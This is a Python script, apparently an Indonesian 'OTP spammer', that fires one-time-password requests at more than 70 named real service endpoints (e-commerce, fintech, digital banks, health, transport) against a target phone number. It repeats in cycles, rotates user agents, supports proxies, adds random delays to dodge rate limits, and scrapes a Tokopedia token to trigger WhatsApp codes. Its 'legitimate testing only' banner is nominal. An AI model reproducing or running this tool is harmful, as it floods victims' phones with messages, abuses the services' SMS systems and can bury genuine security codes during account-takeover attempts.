#!/usr/bin/env python3
import requests
import json
import re
import sys
import random
import time
import argparse
from datetime import datetime
from rich.console import Console
from rich.progress import track
from rich.table import Table
from rich.panel import Panel

console = Console()
log_file = "otp_results.log"

# User‑Agent 2026 (Android 15/16, iOS 18, Desktop)
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.44 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.44 Safari/537.36",
]

# ----------------------------------------------------------------------
# DAFTAR ENDPOINT (70+ yang sering berhasil)
# Format: (url, payload_dict, method="json" atau "form", verifikasi_kata_kunci)
# ----------------------------------------------------------------------
ENDPOINTS = [
    # --- E-Commerce & Marketplace (10) ---
    ("https://www.carsome.id/website/login/sendSMS",
     {"username": "{n}", "optType": 1}, "json", ["otp", "sms"]),
    ("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",
     {"otp_request": {"mobile_number": "0{n}", "mobile_country_code": "+62"}}, "json", ["success", "otp"]),
    ("https://api.blibli.com/v1/register/otp-request",
     {"phoneNumber": "{n}", "channelType": "whatsapp"}, "json", ["otp", "whatsapp"]),
    ("https://api.bukalapak.com/otp/send",
     {"phone": "{n}"}, "json", ["otp", "kode"]),
    ("https://api.jd.id/otp/send",
     {"mobile": "+62{n}"}, "json", ["otp", "verifikasi"]),
    ("https://api.sociolla.com/v1/otp",
     {"phone_number": "{n}"}, "json", ["otp"]),
    ("https://api.zalora.co.id/otp/request",
     {"phone": "{n}"}, "json", ["otp", "sms"]),
    ("https://api.fabelio.com/v1/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.dekoruma.com/auth/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.bhinneka.com/v1/otp",
     {"msisdn": "{n}"}, "json", ["otp"]),

    # --- Fintech & Pembayaran (15) ---
    ("https://api.bibit.id/auth/register/phone",
     {"code": "62", "phone": "{n}", "via": "whatsapp", "recaptcha_token": "", "recaptcha_type": "v3"},
     "json", ["otp", "whatsapp"]),
    ("https://api.dana.id/v1/auth/otp/request",
     {"mobile": "+62{n}", "service": "registration"}, "json", ["otp"]),
    ("https://api.ovo.id/v2.0/api/auth/otp/send",
     {"mobile": "+62{n}"}, "json", ["otp"]),
    ("https://api.linkaja.id/v1/otp/send",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.flip.id/v1/auth/otp",
     {"phone_number": "+62{n}"}, "json", ["otp", "kode"]),
    ("https://api.kredivo.com/v1/phone_verifications",
     {"phone_number": "{n}"}, "json", ["otp"]),
    ("https://api.akulaku.com/otp/send",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.pintu.co.id/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.ajaib.co.id/v1/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.pluang.com/v1/otp/send",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.bareksa.com/v1/otp/send",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.homecredit.co.id/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.julo.co.id/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.indodana.id/auth/otp",
     {"phone_number": "0{n}"}, "json", ["otp"]),
    ("https://api.kredito.id/otp",
     {"phone": "{n}"}, "json", ["otp"]),

    # --- Travel & Tiket (8) ---
    ("https://api.traveloka.com/v2/auth/otp/request",
     {"phone": "{n}", "countryCode": "+62"}, "json", ["otp"]),
    ("https://api.tiket.com/otp/request",
     {"phone": "{n}", "send_to": "sms"}, "json", ["otp"]),
    ("https://auth.tix.id/v1/customer/otp/whatsapp",
     {"mobile": "{n}"}, "json", ["whatsapp", "otp"]),
    ("https://api.kai.id/api/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.misteraladin.com/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.reddoorz.com/auth/otp",
     {"phone_number": "0{n}"}, "json", ["otp"]),
    ("https://api.oyo.com/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.airy.com/auth/otp",
     {"phone_number": "{n}"}, "json", ["otp"]),

    # --- Ride Hailing & Pesan Antar (5) ---
    ("https://api.go-jek.com/gojek/otp",
     {"phone_number": "+62{n}"}, "json", ["otp"]),
    ("https://www.gojek.com/api/auth/otp",
     {"msisdn": "{n}", "via": "sms"}, "json", ["otp"]),
    ("https://api.grab.com/v2/grabid/verify",
     {"msisdn": "{n}", "method": "whatsapp"}, "json", ["whatsapp", "otp"]),
    ("https://api.maxim.id/auth/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.anterin.id/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),

    # --- Grocery & Retail (6) ---
    ("https://api-v2.segari.id/v1/otps/generate",
     {"phoneNumber": "{n}"}, "json", ["otp"]),
    ("https://api.sayurbox.com/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.happyfresh.id/v1/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.tanihub.com/auth/otp",
     {"phone": "0{n}"}, "json", ["otp"]),
    ("https://api.alfagift.id/v1/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.klikindomaret.com/otp/send",
     {"phone_number": "0{n}"}, "json", ["otp"]),

    # --- Kesehatan (5) ---
    ("https://api.halodoc.com/v1/auth/otp",
     {"phone_number": "{n}"}, "json", ["otp"]),
    ("https://api.alodokter.com/v1/otp/request",
     {"mobile": "+62{n}"}, "json", ["otp"]),
    ("https://api.sehatq.com/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.prosehat.com/auth/otp",
     {"phone_number": "0{n}"}, "json", ["otp"]),
    ("https://api.klikdokter.com/otp",
     {"phone": "{n}"}, "json", ["otp"]),

    # --- Entertainment & Streaming (5) ---
    ("https://api.vidio.com/auth/otp",
     {"phone_number": "+62{n}"}, "json", ["otp"]),
    ("https://api.yummy.app/api/v1/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.wetv.vip/otp/send",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.iqiyi.com/auth/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.viu.id/v1/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),

    # --- Logistik & Pengiriman (5) ---
    ("https://api.sicepat.id/otp/send",
     {"phone_number": "0{n}"}, "json", ["otp"]),
    ("https://api.anteraja.id/v1/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.ninjaexpress.id/otp",
     {"phone_number": "0{n}"}, "json", ["otp"]),
    ("https://api.jt.id/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.lionparcel.com/otp",
     {"phone": "{n}"}, "json", ["otp"]),

    # --- Bank Digital (6) ---
    ("https://api.jago.com/auth/otp",
     {"phone_number": "+62{n}"}, "json", ["otp"]),
    ("https://api.jenius.com/v1/auth/otp/send",
     {"msisdn": "{n}"}, "json", ["otp"]),
    ("https://api.seabank.co.id/auth/otp",
     {"phone_number": "+62{n}"}, "json", ["otp"]),
    ("https://api.blu.id/v1/auth/otp",
     {"phone_number": "{n}"}, "json", ["otp"]),
    ("https://api.digibank.dbs.com/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.tmrw.co.id/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),

    # --- Education (3) ---
    ("https://api.ruangguru.com/v1/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.zenius.net/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.cakap.com/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),

    # --- Asuransi & Lainnya (5) ---
    ("https://api.qoala.id/v1/otp/send",
     {"mobile": "+62{n}"}, "json", ["otp"]),
    ("https://api.cermati.com/otp/send",
     {"phone_number": "+62{n}"}, "json", ["otp"]),
    ("https://api.lifepal.co.id/auth/otp",
     {"phone": "+62{n}"}, "json", ["otp"]),
    ("https://api.fuse.id/v1/otp",
     {"phone": "{n}"}, "json", ["otp"]),
    ("https://api.pasarpolis.com/auth/otp",
     {"phone": "{n}"}, "json", ["otp"]),

    # --- Tokopedia (spesial, ditangani terpisah) ---
    ("TOKOPEDIA", None, "special", []),
]

# ----------------------------------------------------------------------
# Fungsi bantuan
# ----------------------------------------------------------------------
def log_result(endpoint, nomor, status, info=""):
    with open(log_file, "a") as f:
        f.write(f"[{datetime.now()}] {endpoint} | +62{nomor} | {status} | {info}\n")

def inject_payload(payload, nomor):
    """Ganti placeholder {n} dengan nomor."""
    if isinstance(payload, dict):
        new = {}
        for k, v in payload.items():
            if isinstance(v, str):
                new[k] = v.replace("{n}", nomor)
            elif isinstance(v, dict):
                new[k] = inject_payload(v, nomor)
            else:
                new[k] = v
        return new
    return payload

def check_success(response, keywords):
    """Cek apakah response body mengandung salah satu keyword."""
    if not response:
        return False
    try:
        text = response.text.lower()
        return any(k.lower() in text for k in keywords)
    except:
        return False

# ----------------------------------------------------------------------
# Fungsi utama spam
# ----------------------------------------------------------------------
def spam(nomor, proxies=None, timeout=10):
    stats = {"success": 0, "fail": 0}
    # Buat session dengan proxy jika ada
    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)

    # Header dasar
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://www.google.com',
        'Referer': 'https://www.google.com/',
    }

    # Penanganan Tokopedia
    try:
        resp = session.get(
            f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0{nomor}",
            headers=headers, timeout=timeout
        )
        token = re.search(r'id="Token" value="([^"]+)"', resp.text)
        if token:
            data = {'otp_type': '116', 'msisdn': f'0{nomor}', 'tk': token.group(1)}
            post_resp = session.post(
                "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
                headers=headers, data=data, timeout=timeout
            )
            if post_resp and check_success(post_resp, ["berhasil", "otp", "whatsapp"]):
                stats["success"] += 1
                log_result("Tokopedia", nomor, "SUCCESS")
            else:
                stats["fail"] += 1
                log_result("Tokopedia", nomor, "FAIL (no OTP keyword)")
        else:
            stats["fail"] += 1
            log_result("Tokopedia", nomor, "FAIL (no token)")
    except Exception as e:
        stats["fail"] += 1
        log_result("Tokopedia", nomor, f"ERROR: {e}")

    # Loop endpoint lainnya
    for url, payload, method, keywords in ENDPOINTS:
        if url == "TOKOPEDIA":
            continue

        # Ganti placeholder di payload
        final_payload = inject_payload(payload, nomor)
        # Rotasi header sesekali
        if random.random() > 0.5:
            headers['User-Agent'] = random.choice(USER_AGENTS)

        try:
            if method == "json":
                resp = session.post(url, headers=headers, json=final_payload, timeout=timeout)
            else:  # form-data
                resp = session.post(url, headers=headers, data=final_payload, timeout=timeout)

            if resp and (resp.status_code in [200, 201, 202] or check_success(resp, keywords)):
                stats["success"] += 1
                log_result(url, nomor, "SUCCESS")
            else:
                stats["fail"] += 1
                log_result(url, nomor, f"FAIL (status={resp.status_code if resp else 'None'})")
        except Exception as e:
            stats["fail"] += 1
            log_result(url, nomor, f"ERROR: {e}")

        # Jeda dinamis (0.3 - 0.8 detik) untuk menghindari rate‑limit
        time.sleep(random.uniform(0.3, 0.8))

    return stats

# ----------------------------------------------------------------------
# Main program
# ----------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Lab OTP Spammer 2026 - 70+ Work Endpoints")
    parser.add_argument("-n", "--nomor", help="Nomor HP target (contoh: 895359611122)")
    parser.add_argument("-c", "--cycles", type=int, default=1, help="Jumlah siklus spam (default: 1)")
    parser.add_argument("--proxy", help="Proxy URL (contoh: http://127.0.0.1:8080 atau socks5://127.0.0.1:9050)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout request (detik, default: 10)")
    args = parser.parse_args()

    # Input nomor jika tidak diberikan
    if args.nomor:
        nomor = args.nomor
    else:
        console.print(Panel("[bold yellow]Lab OTP Spammer – 70+ Endpoint Work 2026[/]\n"
                            "[red]Hanya untuk pengujian sah![/]",
                            width=70, style="bold red"))
        nomor = console.input("[cyan]Nomor HP (+62) : [/]").strip()

    nomor = re.sub(r'[^0-9]', '', nomor)
    if nomor.startswith("62"):
        nomor = nomor[2:]
    elif nomor.startswith("0"):
        nomor = nomor[1:]

    # Proxy
    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}
        console.print(f"[yellow]Menggunakan proxy: {args.proxy}[/]")

    total_sukses, total_gagal = 0, 0
    start_time = time.time()

    for cycle in track(range(args.cycles), description="Mengirim OTP..."):
        console.print(f"[dim]Siklus {cycle+1}/{args.cycles}[/]")
        stats = spam(nomor, proxies=proxies, timeout=args.timeout)
        total_sukses += stats["success"]
        total_gagal += stats["fail"]

    elapsed = time.time() - start_time
    # Tampilkan hasil
    table = Table(title="Hasil Spam OTP")
    table.add_column("Metrik", style="cyan")
    table.add_column("Jumlah", justify="right", style="green")
    table.add_row("Siklus", str(args.cycles))
    table.add_row("Total Request Sukses", str(total_sukses))
    table.add_row("Total Request Gagal", str(total_gagal))
    table.add_row("Waktu", f"{elapsed:.1f} detik")
    console.print(table)
    console.print(f"[white]Log detail tersimpan di [bold]{log_file}[/]")
    console.print(Panel(f"✅ Selesai untuk +62{nomor}", width=50))

if __name__ == "__main__":
    main()
